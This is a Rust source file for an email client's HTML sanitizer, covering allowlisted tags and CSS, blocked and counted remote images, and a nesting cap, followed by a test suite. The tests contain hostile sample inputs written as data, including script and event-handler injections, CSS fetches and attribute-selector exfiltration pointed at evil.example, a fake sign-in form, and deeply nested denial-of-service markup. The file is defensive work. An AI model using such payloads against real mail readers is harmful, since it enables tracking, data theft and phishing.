//! HTML sanitization for message display.
//!
//! This is the layer that stands between a stranger's HTML and the user's
//! screen. It is one of three independent defenses: the
//! sanitizer removes hostile constructs, the sandboxed frame blocks scripts and
//! same-origin access, and the per-message CSP blocks network egress. Each
//! was measured to block a class the others do not, so this code must not
//! assume the others will catch what it misses.
//!
//! Design rules:
//! * **Allowlist, never blocklist.** Anything not explicitly permitted is gone.
//! * **CSS is executable-ish.** Attribute-selector exfiltration and layout
//!   attacks are real, so declarations are filtered and `url()` is banned
//!   outright inside styles.
//! * **Remote content is blocked by default** and *counted*, because "2
//!   trackers removed" is a user-visible promise, not a log line.
//! * **Fail closed.** Anything unparseable degrades to text.

use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

/// What the sanitizer did, for the UI to report honestly.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SanitizeReport {
    /// Remote resources (images, backgrounds) that were blocked.
    pub blocked_remote: usize,
    /// Whether the message contained script-ish constructs at all — useful for
    /// a "this message tried to run code" indicator.
    pub had_dangerous_constructs: bool,
}

#[derive(Debug, Clone)]
pub struct Sanitized {
    pub html: String,
    pub report: SanitizeReport,
}

/// CSS properties an email may set. Layout-affecting properties that enable
/// overlay/clickjacking attacks (`position`, `z-index`, `transform`) are absent
/// on purpose, as is anything that can fetch (`background-image`, `content`).
const ALLOWED_CSS: &[&str] = &[
    "color",
    "background-color",
    "font",
    "font-family",
    "font-size",
    "font-style",
    "font-weight",
    "line-height",
    "letter-spacing",
    "text-align",
    "text-decoration",
    "text-transform",
    "vertical-align",
    "white-space",
    "margin",
    "margin-top",
    "margin-bottom",
    "margin-left",
    "margin-right",
    "padding",
    "padding-top",
    "padding-bottom",
    "padding-left",
    "padding-right",
    "border",
    "border-top",
    "border-bottom",
    "border-left",
    "border-right",
    "border-color",
    "border-style",
    "border-width",
    "border-radius",
    "border-collapse",
    "width",
    "max-width",
    "height",
    "max-height",
    "display",
    "list-style",
    "list-style-type",
];

/// The URL as a browser would read it, before anyone decides anything about
/// it: leading and trailing space gone, and ASCII tabs and newlines removed
/// from anywhere inside, exactly as URL parsing does. `ht<TAB>tps://` is https
/// to the frame, so it has to be https here or it loads uncounted.
fn as_the_browser_reads_it(url: &str) -> String {
    url.trim()
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect()
}

/// Whether the value is a `data:` URL at all.
fn is_data_uri(url: &str) -> bool {
    as_the_browser_reads_it(url)
        .to_ascii_lowercase()
        .starts_with("data:")
}

/// Whether it is one carrying a picture, which is the only kind admitted.
fn is_data_image(url: &str) -> bool {
    as_the_browser_reads_it(url)
        .to_ascii_lowercase()
        .starts_with("data:image/")
}

fn is_remote(url: &str) -> bool {
    let cleaned = as_the_browser_reads_it(url);
    // Protocol-relative first: it has no scheme of its own to parse, and the
    // frame would give it one.
    if cleaned.starts_with("//") {
        return true;
    }
    // Parsed rather than prefix-matched, because a browser accepts far more
    // shapes than `https://` as https: `https:evil.example`, `https:/evil`
    // and `HTTPS:\\evil` are all the same fetch, and each used to be counted
    // as local — the CSP blocked them, so the picture was right and the
    // "3 trackers blocked" underneath it was wrong.
    url::Url::parse(&cleaned).is_ok_and(|u| matches!(u.scheme(), "http" | "https"))
}

/// Gives a URL the full form the frame can actually fetch.
///
/// `//host/logo.png` means "whatever scheme this document uses", which is a
/// sensible default on the web and a broken one here: the reading frame is
/// served over `petrel-msg:`, so the browser resolves it to
/// `petrel-msg://host/logo.png` and asks us for a message we do not have. The
/// image then fails silently even though the reader allowed remote content.
///
/// Resolved to `https:` rather than `http:` because a URL that declined to
/// name a scheme has expressed no preference, and one of the two is encrypted.
///
/// The abbreviated http forms — `https:host/x.png`, `https:/host`, and the
/// backslashed spelling — are written out the same way, since that is what
/// they mean and leaving them alone leaves the reader with a broken image.
fn absolute_scheme(url: &str) -> std::borrow::Cow<'static, str> {
    let cleaned = as_the_browser_reads_it(url);
    if cleaned.starts_with("//") {
        return format!("https:{cleaned}").into();
    }
    match url::Url::parse(&cleaned) {
        Ok(parsed) if matches!(parsed.scheme(), "http" | "https") => parsed.to_string().into(),
        _ => url.to_owned().into(),
    }
}

/// Filters a `style` attribute down to the allowlist. Any declaration that
/// could fetch a resource or reposition content is dropped rather than
/// rewritten — a mangled style is a cosmetic problem, a fetching one is a
/// privacy breach.
fn filter_style(value: &str) -> String {
    let mut kept = Vec::new();
    for decl in value.split(';') {
        let Some((prop, val)) = decl.split_once(':') else {
            continue;
        };
        let prop_norm = prop.trim().to_ascii_lowercase();
        let val_trim = val.trim();
        let val_norm = val_trim.to_ascii_lowercase();
        if !ALLOWED_CSS.contains(&prop_norm.as_str()) {
            continue;
        }
        // No fetching, no expressions, no escapes used to smuggle either.
        // `list-style` takes an image, and image-set() is not url(), so the
        // fetching functions are named one by one.
        if val_norm.contains("url(")
            || val_norm.contains("image(")
            || val_norm.contains("image-set(")
            || val_norm.contains("cross-fade(")
            || val_norm.contains("element(")
            || val_norm.contains("paint(")
            || val_norm.contains("src(")
            || val_norm.contains("expression")
            || val_norm.contains("javascript:")
            || val_norm.contains("@import")
            || val_norm.contains('\\')
        {
            continue;
        }
        kept.push(format!("{prop_norm}: {val_trim}"));
    }
    kept.join("; ")
}

fn builder_tags() -> HashSet<&'static str> {
    [
        "a",
        "b",
        "blockquote",
        "br",
        "caption",
        "code",
        "col",
        "colgroup",
        "dd",
        "div",
        "dl",
        "dt",
        "em",
        "figcaption",
        "figure",
        "h1",
        "h2",
        "h3",
        "h4",
        "h5",
        "h6",
        "hr",
        "i",
        "img",
        "li",
        "ol",
        "p",
        "pre",
        "q",
        "s",
        "small",
        "span",
        "strike",
        "strong",
        "sub",
        "sup",
        "table",
        "tbody",
        "td",
        "tfoot",
        "th",
        "thead",
        "tr",
        "u",
        "ul",
    ]
    .into_iter()
    .collect()
}

fn tag_attributes() -> HashMap<&'static str, HashSet<&'static str>> {
    let mut m: HashMap<&'static str, HashSet<&'static str>> = HashMap::new();
    m.insert("a", ["href", "title"].into_iter().collect());
    m.insert(
        "img",
        [
            "src", "alt", "title", "width", "height", "border", "hspace", "vspace",
        ]
        .into_iter()
        .collect(),
    );
    // The presentational table attributes, which in mail are not decoration
    // but structure. A great deal of real mail is a mosaic of image slices
    // positioned entirely by `<td width>` and held flush by `cellspacing="0"`;
    // drop those and the browser falls back to auto-layout and its default 2px
    // border-spacing, so the picture arrives cut into strips with white seams
    // between them. Every attribute here is geometry or a colour word: none of
    // them can fetch, script, or reposition content over the rest of the page.
    //
    // `background` is the exception: it takes a URL, so it is a remote fetch
    // and a tracking vector like any image. It is listed here but decided in
    // the attribute filter below, on exactly the same terms as `img src` —
    // removed and counted when remote content is blocked.
    let cell = [
        "colspan",
        "rowspan",
        "align",
        "valign",
        "width",
        "height",
        "bgcolor",
        "background",
    ];
    m.insert("td", cell.into_iter().collect());
    m.insert("th", cell.into_iter().collect());
    m.insert(
        "tr",
        ["align", "valign", "height", "bgcolor", "background"]
            .into_iter()
            .collect(),
    );
    m.insert(
        "table",
        [
            "width",
            "height",
            "align",
            "bgcolor",
            "border",
            "cellpadding",
            "cellspacing",
            "background",
        ]
        .into_iter()
        .collect(),
    );
    m
}

/// How deep a message may nest before the rest of the tree is flattened.
///
/// Far past anything real mail contains: the deepest hand-written newsletter
/// tables run to a few dozen. What this is for is the other kind, where the
/// depth *is* the payload — 10,000 nested divs is 110 KB of HTML that took
/// two and a half seconds to sanitize, and 50,000 took a minute, both on the
/// thread the window draws on.
const MAX_NESTING: usize = 512;

/// Drops tags that would nest deeper than the cap, keeping their content.
///
/// A pre-pass rather than a limit inside the sanitizer, because the parser
/// builds the whole tree before anything gets to look at it. Under the cap
/// this returns the input untouched, so ordinary mail is not reshaped by a
/// defence it never triggers.
fn cap_nesting(html: &str) -> std::borrow::Cow<'_, str> {
    // Elements that never open a level: they have no closing tag to match.
    const VOID: &[&str] = &[
        "area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "param",
        "source", "track", "wbr",
    ];
    let bytes = html.as_bytes();
    let mut depth = 0usize;
    // Opens dropped for being too deep, whose closing tags must go too.
    let mut dropped = 0usize;
    let mut out: Option<String> = None;
    let mut i = 0usize;
    let mut copied = 0usize;
    while let Some(offset) = html[i..].find('<') {
        let start = i + offset;
        let rest = &html[start..];
        // Comments and doctypes carry no nesting and are left alone.
        if rest.starts_with("<!") {
            i = start + 2;
            continue;
        }
        let closing = rest.starts_with("</");
        let name_at = start + if closing { 2 } else { 1 };
        if !bytes.get(name_at).is_some_and(u8::is_ascii_alphabetic) {
            i = start + 1;
            continue;
        }
        // The tag runs to its `>`, with quoted attribute values skipped so a
        // `>` inside one does not end it early.
        let mut j = name_at;
        let mut quote: Option<u8> = None;
        while j < bytes.len() {
            match (quote, bytes[j]) {
                (Some(q), c) if c == q => quote = None,
                (None, c @ (b'"' | b'\'')) => quote = Some(c),
                (None, b'>') => break,
                _ => {}
            }
            j += 1;
        }
        if j >= bytes.len() {
            break;
        }
        let end = j + 1;
        let name: String = html[name_at..j]
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '-')
            .collect::<String>()
            .to_ascii_lowercase();
        let self_closing = html[name_at..j].trim_end().ends_with('/');
        if VOID.contains(&name.as_str()) || self_closing {
            i = end;
            continue;
        }
        let drop_it = if closing {
            if dropped > 0 {
                dropped -= 1;
                true
            } else {
                depth = depth.saturating_sub(1);
                false
            }
        } else if depth >= MAX_NESTING {
            dropped += 1;
            true
        } else {
            depth += 1;
            false
        };
        if drop_it {
            let buffer = out.get_or_insert_with(|| String::with_capacity(html.len()));
            buffer.push_str(&html[copied..start]);
            copied = end;
        }
        i = end;
    }
    match out {
        Some(mut buffer) => {
            buffer.push_str(&html[copied..]);
            buffer.into()
        }
        None => html.into(),
    }
}

/// Sanitizes a message body for display.
///
/// `allow_remote` reflects an explicit user decision for this sender; when
/// false (the default), remote resources are removed and counted.
pub fn sanitize_html(html: &str, allow_remote: bool) -> Sanitized {
    let blocked = Arc::new(AtomicUsize::new(0));
    let blocked_cb = blocked.clone();

    // Cheap pre-scan purely for the "tried to run code" signal; removal is
    // ammonia's job, not this check's.
    let lower = html.to_ascii_lowercase();
    let had_dangerous = lower.contains("<script")
        || lower.contains("javascript:")
        || lower.contains(" onerror")
        || lower.contains(" onload")
        || lower.contains("<iframe")
        || lower.contains("<object")
        || lower.contains("<embed");

    let mut builder = ammonia::Builder::default();
    builder
        .tags(builder_tags())
        // Remove these tags *with their contents*. Stripping the tag alone
        // leaves the text behind, and for a phishing form the text is the
        // attack ("Sign in", "Verify your password"). Scripts and styles would
        // likewise dump their source into the rendered body.
        .clean_content_tags(
            [
                "script", "style", "form", "button", "input", "select", "option", "textarea",
                "iframe", "object", "embed", "applet", "noscript", "template", "svg", "math",
                "head", "title", "meta", "link", "base",
            ]
            .into_iter()
            .collect(),
        )
        .tag_attributes(tag_attributes())
        .generic_attributes(["style", "align", "dir", "lang"].into_iter().collect())
        // `cid:` stays so inline images can be resolved from the message's own
        // parts. `data:` is admitted here and then narrowed in the attribute
        // filter below to images on an `img`: the bytes are the message's own
        // and the frame's own policy already allows them, so stripping them
        // left a broken picture — but `data:text/html` in a link is a page
        // wearing someone else's name, which is why it cannot be a blanket
        // permission.
        .url_schemes(
            ["http", "https", "mailto", "cid", "data"]
                .into_iter()
                .collect(),
        )
        .link_rel(Some("noopener noreferrer nofollow"))
        // Namespacing stops a message's ids from colliding with (or targeting)
        // the surrounding document.
        .id_prefix(Some("m-"))
        .attribute_filter(move |element, attribute, value| {
            // A data: URL is the message's own bytes, so it is never a fetch
            // and never counted — but only as a picture, and only where a
            // picture goes.
            if is_data_uri(value) {
                let picture = matches!((element, attribute), ("img", "src") | (_, "background"));
                return (picture && is_data_image(value)).then(|| value.into());
            }
            match (element, attribute) {
                // `background` is a URL like `src` is, so it answers to the
                // same rule. Sharing the arm is the point: a second place that
                // decides whether mail may fetch something is a second place
                // for the two answers to drift apart.
                ("img", "src") | (_, "background") => {
                    if is_remote(value) && !allow_remote {
                        blocked_cb.fetch_add(1, Ordering::Relaxed);
                        return None;
                    }
                    Some(absolute_scheme(value))
                }
                (_, "style") => {
                    let filtered = filter_style(value);
                    if filtered.is_empty() {
                        None
                    } else {
                        Some(filtered.into())
                    }
                }
                _ => Some(value.into()),
            }
        });

    let html = builder.clean(&cap_nesting(html)).to_string();
    Sanitized {
        html,
        report: SanitizeReport {
            blocked_remote: blocked.load(Ordering::Relaxed),
            had_dangerous_constructs: had_dangerous,
        },
    }
}

/// Points `cid:` images at somewhere a webview can actually fetch.
///
/// A `cid:` URL names one of the message's own MIME parts, and only a native
/// mail renderer knows how to follow it — to a webview it is a broken image.
/// The parts themselves are already served one by one over the message
/// protocol, so this rewrites each reference to that route and the picture
/// arrives from the message's own bytes, never the network.
///
/// Runs on *sanitized* HTML — the sanitizer keeps `cid:` URLs precisely so
/// this can resolve them — and matches the sanitizer's serialized form, which
/// HTML-escapes attribute values. A reference to a part the message does not
/// carry stays as it is: a broken placeholder is truthful, and inventing a
/// URL for it would only turn "the sender forgot the image" into a 404.
pub fn resolve_cids(
    html: &str,
    attachments: &[crate::Attachment],
    href: impl Fn(usize) -> String,
) -> String {
    let mut out = html.to_string();
    for (index, att) in attachments.iter().enumerate() {
        let Some(id) = att.content_id.as_deref() else {
            continue;
        };
        // The id as the sanitizer would have serialized it inside an
        // attribute. Angle brackets are already stripped at parse time.
        let escaped = id
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;");
        let target = href(index);
        // Both quoted attribute forms, because `src` on an img and
        // `background` on a table both survive sanitization.
        for needle in [format!("=\"cid:{escaped}\""), format!("='cid:{escaped}'")] {
            out = out.replace(&needle, &format!("=\"{target}\""));
        }
    }
    out
}

/// Whether a message says its colors work in the dark.
///
/// The convention is a `<meta name="color-scheme" content="light dark">` (or
/// Apple's earlier `supported-color-schemes`) in the head — a sender's
/// statement that their inline colors were designed for both grounds. It is
/// read from the *raw* HTML because the sanitizer strips `head` and `meta`
/// before rendering; the declaration is consumed here and never reaches the
/// frame.
///
/// Only the meta form is honored. A `color-scheme` property inside a style
/// sheet never survives sanitization anyway (style tags are removed whole),
/// so honoring it would mean trusting a declaration whose machinery we then
/// take away.
pub fn declares_dark(html: &str) -> bool {
    let lower = html.to_ascii_lowercase();
    let mut rest = lower.as_str();
    while let Some(start) = rest.find("<meta") {
        let tag = match rest[start..].find('>') {
            Some(end) => &rest[start..start + end],
            None => &rest[start..],
        };
        if tag.contains("color-scheme") && tag.contains("dark") {
            return true;
        }
        rest = &rest[start + "<meta".len()..];
    }
    false
}

/// Renders a plain-text body as safe HTML, preserving quote structure.
pub fn plain_text_to_html(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 64);
    out.push_str("<div class=\"petrel-plain\">");
    for line in text.lines() {
        let escaped = line
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;");
        if line.trim_start().starts_with('>') {
            out.push_str("<div class=\"q\">");
            out.push_str(&escaped);
            out.push_str("</div>");
        } else {
            out.push_str("<div>");
            out.push_str(&escaped);
            out.push_str("</div>");
        }
    }
    out.push_str("</div>");
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(html: &str) -> String {
        sanitize_html(html, false).html
    }

    #[test]
    fn a_tab_in_the_scheme_cannot_hide_a_remote_image() {
        // Browsers strip tabs and newlines from a URL before reading it, so
        // this is https to the frame and used to pass the check uncounted.
        let res = sanitize_html("<img src=\"ht\ttps://evil.example/x.png\">", false);
        assert_eq!(res.report.blocked_remote, 1);
        assert!(!res.html.contains("evil.example"), "{}", res.html);
    }

    #[test]
    fn a_list_marker_cannot_fetch() {
        let res = sanitize_html(
            "<ul style=\"list-style: image-set('https://evil.example/a.png' 1x)\"><li>x</li></ul>",
            false,
        );
        assert!(!res.html.contains("evil.example"), "{}", res.html);
        let webkit = sanitize_html(
            "<ul style=\"list-style-type: -webkit-image-set('https://evil.example/a.png' 1x)\"><li>x</li></ul>",
            true,
        );
        assert!(!webkit.html.contains("evil.example"), "{}", webkit.html);
    }

    #[test]
    fn scripts_and_handlers_are_removed() {
        let out = clean(
            r#"<p onclick="steal()">hi</p><script>alert(1)</script>
               <img src="x" onerror="alert(2)"><iframe src="https://evil.example"></iframe>"#,
        );
        assert!(!out.contains("script"), "{out}");
        assert!(!out.contains("onclick"), "{out}");
        assert!(!out.contains("onerror"), "{out}");
        assert!(!out.contains("<iframe"), "{out}");
        assert!(out.contains("hi"), "legitimate text must survive: {out}");
    }

    #[test]
    fn table_geometry_survives() {
        // A sliced-image mosaic is positioned entirely by these attributes.
        // Losing them does not degrade the picture, it dismantles it.
        let res = sanitize_html(
            r##"<table cellpadding="0" cellspacing="0" border="0" bgcolor="#ff0000">
                 <tr valign="top"><td width="320" height="15" bgcolor="#ffffff">a</td></tr>
               </table>"##,
            true,
        );
        for want in [
            "cellpadding=\"0\"",
            "cellspacing=\"0\"",
            "width=\"320\"",
            "height=\"15\"",
            "valign=\"top\"",
            "bgcolor",
        ] {
            assert!(res.html.contains(want), "lost {want}: {}", res.html);
        }
    }

    #[test]
    fn cell_backgrounds_follow_the_remote_content_rule() {
        // A `background` URL fetches exactly like an image source, so it is
        // counted and removed on the same terms rather than treated as layout.
        let markup = r#"<table background="http://cdn.example/bg.png"><tr><td>x</td></tr></table>"#;

        let blocked = sanitize_html(markup, false);
        assert!(!blocked.html.contains("cdn.example"), "{}", blocked.html);
        assert_eq!(blocked.report.blocked_remote, 1);

        let allowed = sanitize_html(markup, true);
        assert!(
            allowed.html.contains("http://cdn.example/bg.png"),
            "{}",
            allowed.html
        );
        assert_eq!(allowed.report.blocked_remote, 0);
    }

    #[test]
    fn layout_attributes_cannot_smuggle_a_fetch() {
        // The geometry allowlist must stay geometry: anything taking a URL has
        // to go through the remote-content decision, never round it.
        let res = sanitize_html(
            r#"<td style="background-image: url('https://evil.example/x')" width="10">a</td>"#,
            true,
        );
        assert!(!res.html.contains("evil.example"), "{}", res.html);
    }

    #[test]
    fn protocol_relative_images_are_given_a_scheme() {
        // `//host/x.png` inherits the document's scheme, and the document is
        // served over `petrel-msg:` — so left alone it resolves to a message
        // URL that cannot exist, and the image fails with remote content on.
        let res = sanitize_html(r#"<img src="//cdn.example/logo.png">"#, true);
        assert!(
            res.html.contains("https://cdn.example/logo.png"),
            "{}",
            res.html
        );
    }

    #[test]
    fn protocol_relative_images_are_still_blocked_when_remote_is_off() {
        let res = sanitize_html(r#"<img src="//cdn.example/logo.png">"#, false);
        assert!(!res.html.contains("cdn.example"), "{}", res.html);
        assert_eq!(res.report.blocked_remote, 1);
    }

    #[test]
    fn plaintext_image_hosts_survive_when_remote_is_allowed() {
        // Older mail is full of these; the reading pane's policy has to admit
        // the scheme as well as keeping the URL.
        let res = sanitize_html(r#"<img src="http://image.example/spacer.gif">"#, true);
        assert!(
            res.html.contains("http://image.example/spacer.gif"),
            "{}",
            res.html
        );
        assert_eq!(res.report.blocked_remote, 0);
    }

    /// A pasted screenshot travels as `data:image/png;base64,…`, which is the
    /// message's own bytes and not a fetch. The frame's policy allows them, so
    /// stripping them only ever left a broken picture — but the permission
    /// stops at pictures, and at `img`.
    #[test]
    fn inline_data_images_survive_and_nothing_else_data_does() {
        let png = "data:image/png;base64,iVBORw0KGgo=";
        let res = sanitize_html(
            &format!(
                r#"<img src="{png}"><a href="data:text/html,<b>hi</b>">l</a>
                   <img src="data:text/html;base64,PHNjcmlwdD4=">"#
            ),
            false,
        );
        assert!(res.html.contains(png), "the picture stays: {}", res.html);
        assert!(!res.html.contains("text/html"), "{}", res.html);
        assert_eq!(
            res.report.blocked_remote, 0,
            "the message's own bytes are not a tracker"
        );
    }

    #[test]
    fn dangerous_url_schemes_are_dropped() {
        let out = clean(
            r#"<a href="javascript:alert(1)">click</a>
               <a href="data:text/html,<script>x</script>">data</a>
               <a href="https://example.com/ok">fine</a>"#,
        );
        assert!(!out.contains("javascript:"), "{out}");
        assert!(!out.contains("data:text/html"), "{out}");
        assert!(out.contains("https://example.com/ok"), "{out}");
        // Outbound links must not hand the opener over to the destination.
        assert!(out.contains("noopener"), "{out}");
    }

    #[test]
    fn remote_images_are_blocked_and_counted() {
        let res = sanitize_html(
            r#"<img src="https://tracker.example/pixel.gif?u=1" width="1" height="1">
               <img src="http://other.example/beacon.png">
               <img src="cid:inline-part-1">"#,
            false,
        );
        assert_eq!(res.report.blocked_remote, 2);
        assert!(!res.html.contains("tracker.example"), "{}", res.html);
        assert!(!res.html.contains("beacon.png"), "{}", res.html);
        // Inline parts are the message's own content, not a network fetch.
        assert!(res.html.contains("cid:inline-part-1"), "{}", res.html);
    }

    #[test]
    fn a_sender_declaring_dark_support_is_recognised() {
        assert!(declares_dark(
            r#"<html><head><meta name="color-scheme" content="light dark"></head><body>x</body></html>"#
        ));
        // Apple's earlier spelling of the same statement.
        assert!(declares_dark(
            r#"<head><META NAME="supported-color-schemes" CONTENT="light dark"></head>"#
        ));
        // Attribute order is the sender's business.
        assert!(declares_dark(
            r#"<meta content="dark light" name="color-scheme">"#
        ));
    }

    #[test]
    fn mail_that_never_mentions_dark_is_not_volunteered_for_it() {
        assert!(!declares_dark(r#"<p>ordinary mail</p>"#));
        // Saying "light only" is a declaration *against* dark.
        assert!(!declares_dark(
            r#"<meta name="color-scheme" content="light only">"#
        ));
        // The word elsewhere in the message is not a declaration.
        assert!(!declares_dark(r#"<p>a dark and stormy color-scheme</p>"#));
    }

    #[test]
    fn cid_images_resolve_to_the_part_route_after_sanitizing() {
        let attachments = vec![
            crate::Attachment {
                filename: Some("logo.png".into()),
                content_type: Some("image/png".into()),
                size: 10,
                content_id: Some("logo@mailer.example".into()),
                is_inline: true,
            },
            crate::Attachment {
                filename: Some("report.pdf".into()),
                content_type: Some("application/pdf".into()),
                size: 99,
                content_id: None,
                is_inline: false,
            },
            crate::Attachment {
                filename: None,
                content_type: Some("image/jpeg".into()),
                size: 12,
                content_id: Some("photo&2@mailer.example".into()),
                is_inline: true,
            },
        ];
        // Through the real sanitizer first, because that is the shape the
        // resolver actually receives — escaped attributes and all.
        let sanitized = sanitize_html(
            r#"<img src="cid:logo@mailer.example"><img src="cid:photo&2@mailer.example">"#,
            false,
        );
        let out = resolve_cids(&sanitized.html, &attachments, |i| {
            format!("/attachment/tok/{i}")
        });
        assert!(out.contains(r#"src="/attachment/tok/0""#), "{out}");
        // The ampersand id matches through the sanitizer's own escaping, and
        // resolves to index 2 — position in the part list, not among cids.
        assert!(out.contains(r#"src="/attachment/tok/2""#), "{out}");
        assert!(!out.contains("cid:"), "{out}");
    }

    #[test]
    fn a_cid_no_part_answers_stays_a_cid() {
        let attachments = vec![crate::Attachment {
            filename: None,
            content_type: Some("image/png".into()),
            size: 5,
            content_id: Some("present@x".into()),
            is_inline: true,
        }];
        let out = resolve_cids(r#"<img src="cid:missing@x">"#, &attachments, |i| {
            format!("/attachment/tok/{i}")
        });
        // The sender referenced a part they never attached. A truthful broken
        // image, not an invented URL.
        assert_eq!(out, r#"<img src="cid:missing@x">"#);
    }

    #[test]
    fn consent_allows_remote_images() {
        let res = sanitize_html(r#"<img src="https://cdn.example/logo.png">"#, true);
        assert_eq!(res.report.blocked_remote, 0);
        assert!(res.html.contains("cdn.example/logo.png"));
    }

    /// CSS is an exfiltration channel, not just styling: a `url()` in a
    /// stylesheet was observed phoning home from inside a sandboxed frame.
    #[test]
    fn css_cannot_fetch_or_reposition() {
        let out = clean(
            r#"<p style="color: red; background-image: url('https://evil.example/x?a=1')">a</p>
               <div style="position: fixed; top: 0; z-index: 99999; width: 100%">overlay</div>
               <span style="background: url(https://evil.example/y)">b</span>
               <b style="width: expression(alert(1))">c</b>"#,
        );
        assert!(!out.contains("evil.example"), "css must not fetch: {out}");
        assert!(!out.contains("position"), "no overlay positioning: {out}");
        assert!(!out.contains("z-index"), "{out}");
        assert!(!out.contains("expression"), "{out}");
        // The safe declaration survives, so ordinary mail still looks right.
        assert!(out.contains("color: red"), "{out}");
    }

    #[test]
    fn attribute_selector_exfiltration_is_defused() {
        // The PortSwigger class of attack: a style block whose selectors leak
        // input values one character at a time.
        let out = clean(
            r#"<style>input[value^="a"]{background:url(https://evil.example/a)}</style>
               <input value="secret"><p>body</p>"#,
        );
        assert!(!out.contains("evil.example"), "{out}");
        assert!(
            !out.contains("<style"),
            "style blocks are not allowed: {out}"
        );
        assert!(
            !out.contains("<input"),
            "form inputs are not allowed: {out}"
        );
        assert!(out.contains("body"));
    }

    #[test]
    fn forms_and_embedded_objects_are_removed() {
        let out = clean(
            r#"<form action="https://evil.example/post"><input name="p" type="password">
               <button>Sign in</button></form><object data="x.swf"></object><embed src="y">"#,
        );
        assert!(!out.contains("<form"), "{out}");
        assert!(!out.contains("password"), "{out}");
        assert!(!out.contains("<object"), "{out}");
        assert!(!out.contains("<embed"), "{out}");
        // The form's *text* goes too: "Sign in" is the phishing lure, and
        // leaving it behind produces a convincing fragment with no form.
        assert!(
            !out.contains("Sign in"),
            "form contents must not survive: {out}"
        );
    }

    #[test]
    fn script_and_style_source_never_leaks_into_the_body() {
        let out = clean(
            "<style>body{color:red}</style><script>var secret = 'leak me';</script><p>text</p>",
        );
        assert!(!out.contains("color:red"), "{out}");
        assert!(!out.contains("leak me"), "{out}");
        assert!(out.contains("text"));
    }

    /// A message must not be able to name elements in the surrounding document.
    /// `id` isn't on the allowlist at all, so it is removed rather than
    /// namespaced — stricter than needed, and the cost (in-message anchor links
    /// stop working) is one almost no mail relies on. `id_prefix` stays
    /// configured so that if ids are ever admitted, they arrive namespaced.
    #[test]
    fn ids_cannot_reach_the_surrounding_document() {
        let out = clean(r#"<div id="app-root">x</div><span id="root">y</span>"#);
        assert!(!out.contains("app-root"), "{out}");
        assert!(!out.contains("id="), "{out}");
        assert!(
            out.contains('x') && out.contains('y'),
            "content survives: {out}"
        );
    }

    #[test]
    fn ordinary_formatting_survives_intact() {
        let out = clean(
            r#"<p><b>Bold</b> and <i>italic</i>, a <a href="https://example.com">link</a>,
               <ul><li>one</li><li>two</li></ul>
               <table><tr><td colspan="2">cell</td></tr></table>
               <blockquote>quoted</blockquote></p>"#,
        );
        for expected in [
            "<b>",
            "<i>",
            "<ul>",
            "<li>",
            "<table>",
            "colspan",
            "<blockquote>",
        ] {
            assert!(out.contains(expected), "lost {expected}: {out}");
        }
    }

    #[test]
    fn hostile_input_never_panics() {
        for raw in [
            "",
            "<",
            "<<<<<<",
            "<p".repeat(5000).as_str(),
            "<div>".repeat(2000).as_str(),
            "\u{0}\u{1}<p>x</p>",
            "<p style=\"color:\">x</p>",
            "<p style=\";;;;\">x</p>",
        ] {
            let _ = sanitize_html(raw, false);
        }
    }

    /// Every abbreviated http form a browser accepts. The CSP blocked these
    /// all along; what was wrong was the count under the message, which is a
    /// promise to the reader rather than a log line.
    #[test]
    fn the_short_spellings_of_http_are_remote_too() {
        let res = sanitize_html(
            r#"<img src="https:evil.example/a.png"><img src="https:/evil.example/b.png">
               <img src="HTTPS:\\evil.example\c.png"><img src="http:evil.example/d.png">"#,
            false,
        );
        assert_eq!(res.report.blocked_remote, 4, "{}", res.html);
        assert!(!res.html.contains("evil.example"), "{}", res.html);

        // With remote content allowed they are written out in full, so the
        // frame can actually fetch them.
        let res = sanitize_html(r#"<img src="https:cdn.example/a.png">"#, true);
        assert!(
            res.html.contains("https://cdn.example/a.png"),
            "{}",
            res.html
        );
        assert_eq!(res.report.blocked_remote, 0);

        // And nothing that was never remote has become so.
        let res = sanitize_html(
            r#"<img src="cid:part@x"><img src="/relative.png"><a href="mailto:x@y.example">m</a>"#,
            false,
        );
        assert_eq!(res.report.blocked_remote, 0, "{}", res.html);
    }

    /// Depth as a payload: 50,000 nested divs is 300 KB of HTML that took the
    /// best part of a minute, on the thread the window draws on.
    #[test]
    fn a_deeply_nested_message_is_flattened_rather_than_dwelt_on() {
        let deep = format!("{}x{}", "<div>".repeat(50_000), "</div>".repeat(50_000));
        let started = std::time::Instant::now();
        let out = sanitize_html(&deep, false);
        assert!(
            started.elapsed() < std::time::Duration::from_secs(1),
            "took {:?}",
            started.elapsed()
        );
        assert!(
            out.html.contains('x'),
            "the content survives the flattening"
        );
        assert!(
            out.html.matches("<div>").count() <= MAX_NESTING,
            "capped at the limit, not at whatever was sent"
        );
    }

    #[test]
    fn ordinary_nesting_is_left_exactly_as_it_was() {
        // Under the cap the pre-pass must be invisible: real mail nests a few
        // dozen deep and must not be reshaped by a defence it never trips.
        let nested = format!("{}hello{}", "<div>".repeat(40), "</div>".repeat(40));
        assert!(matches!(
            cap_nesting(&nested),
            std::borrow::Cow::Borrowed(_)
        ));
        let quoted = r#"<td width=">"><img src="x" alt="a > b"><br>text<hr/></td>"#;
        assert!(matches!(cap_nesting(quoted), std::borrow::Cow::Borrowed(_)));
        // Void and self-closing elements do not open a level, so a long
        // sequence of them is not nesting at all.
        let voids = "<br>".repeat(5_000);
        assert!(matches!(cap_nesting(&voids), std::borrow::Cow::Borrowed(_)));
    }

    #[test]
    fn plain_text_is_escaped_and_quotes_marked() {
        let out = plain_text_to_html("hello <script>\n> quoted line\nplain");
        assert!(!out.contains("<script>"), "{out}");
        assert!(out.contains("&lt;script&gt;"), "{out}");
        assert!(
            out.contains("class=\"q\""),
            "quotes should be marked: {out}"
        );
    }
}
